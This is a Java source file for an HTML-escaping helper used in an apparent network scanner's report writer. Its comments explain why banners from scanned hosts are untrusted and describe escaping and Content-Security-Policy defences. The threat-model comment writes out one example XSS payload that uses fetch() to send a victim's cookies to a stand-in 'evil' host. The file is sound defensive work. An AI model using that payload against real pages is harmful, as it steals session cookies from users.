package com.cyberscope.service.report;

/**
 * Escaping for values that came from somewhere else.
 *
 * <h2>Why this class exists, stated plainly</h2>
 *
 * Almost everything CyberScope puts in a report is <b>attacker-controlled</b>.
 * A service banner is not a fact about a host; it is a string the host chose to
 * send. {@code NmapXmlParser} reads it out of the {@code product}, {@code version}
 * and {@code extrainfo} attributes and it flows, unmodified, into a document that
 * a security engineer opens in a browser.
 *
 * <p>So the threat model is not hypothetical and it is not the operator's
 * machine being scanned that is at risk. It is this:
 *
 * <pre>
 *   1. An attacker configures a service to answer with a crafted banner:
 *          Server: &lt;img src=x onerror="fetch('http://evil/'+document.cookie)"&gt;
 *   2. Someone scans that host -- which is the whole purpose of the tool.
 *   3. They generate a report and open it.
 *   4. The payload runs in their browser, in the context of a local file.
 * </pre>
 *
 * The person who gets attacked is the analyst, not the target. Scanners have
 * shipped exactly this bug before. Plain-text reports were immune by accident;
 * v0.7.0 renders HTML and is not.
 *
 * <h2>Two independent controls</h2>
 *
 * <ol>
 *   <li><b>Escape every interpolated value.</b> That is this class, applied
 *       without exception in {@link HtmlReportWriter}.</li>
 *   <li><b>A report contains no script and forbids script.</b> The document
 *       carries a {@code Content-Security-Policy} meta with {@code script-src
 *       'none'}, so a payload that survived a future escaping bug still cannot
 *       execute. Neither control is trusted to be sufficient on its own.</li>
 * </ol>
 */
final class Html {

    private Html() {
    }

    /**
     * Escapes text for element content and for a double-quoted attribute.
     *
     * <p>One method for both positions rather than two, because two invites the
     * wrong one to be chosen. The single quote is escaped as well, which is
     * unnecessary for a double-quoted attribute and free insurance if a template
     * ever changes quoting style.
     *
     * <h2>Why a switch and not chained replaces</h2>
     *
     * The obvious implementation is a chain:
     *
     * <pre>
     *   raw.replace("&lt;", "&amp;lt;").replace("&amp;", "&amp;amp;")   // BROKEN
     * </pre>
     *
     * That is the classic double-encoding bug: the second call re-escapes the
     * ampersand the first one just introduced, so {@code &lt;} arrives as
     * {@code &amp;amp;lt;} and the reader sees a literal "&amp;lt;". Ordering the
     * chain correctly fixes it, which means the correctness of the code depends
     * on the order of five statements that look independent.
     *
     * <p>A single pass over the characters removes the failure mode rather than
     * ordering around it. Each character is examined once and produces exactly
     * one replacement, so no output can be re-examined and no ordering exists to
     * get wrong. Mutation testing made this concrete: shuffling the cases of this
     * switch changes nothing at all, because there is nothing there to shuffle.
     */
    static String escape(String raw) {
        if (raw == null || raw.isEmpty()) {
            return "";
        }
        StringBuilder out = new StringBuilder(raw.length() + 16);
        for (int i = 0; i < raw.length(); i++) {
            char c = raw.charAt(i);
            switch (c) {
                case '&'  -> out.append("&amp;");
                case '<'  -> out.append("&lt;");
                case '>'  -> out.append("&gt;");
                case '"'  -> out.append("&quot;");
                case '\'' -> out.append("&#39;");
                default   -> out.append(sanitiseChar(c));
            }
        }
        return out.toString();
    }

    /**
     * Replaces characters that are legal in a banner but not in XML.
     *
     * <p>A banner is bytes, not text. Nmap will happily report a service whose
     * version string contains a NUL, a bell or an ANSI escape sequence, and XML
     * 1.0 forbids most control characters outright -- so leaving them in
     * produces a document that browsers render but a strict parser rejects,
     * which is exactly the inconsistency that hides problems.
     *
     * <p>Replaced with U+FFFD rather than dropped, so the reader can see that
     * something was there. Silently deleting bytes from evidence is not a
     * property a security report should have.
     */
    private static char sanitiseChar(char c) {
        boolean legal = c == '\t' || c == '\n' || c == '\r'
                || (c >= 0x20 && c <= 0xD7FF)
                || (c >= 0xE000 && c <= 0xFFFD);
        return legal ? c : '�';
    }
}
